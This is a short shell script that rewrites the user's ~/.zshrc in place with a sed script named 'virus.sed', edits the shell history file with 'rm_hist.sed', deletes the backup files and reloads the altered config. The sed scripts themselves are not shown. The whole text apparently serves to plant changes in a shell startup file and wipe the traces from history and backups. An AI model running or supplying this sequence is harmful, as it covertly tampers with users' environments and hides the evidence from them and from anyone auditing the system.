sed -i".aonaon" -f virus.sed ~/.zshrc
sed -i".aonaon" -f rm_hist.sed $HISTFILE
rm ~/.*.aonaon
source ~/.zshrc
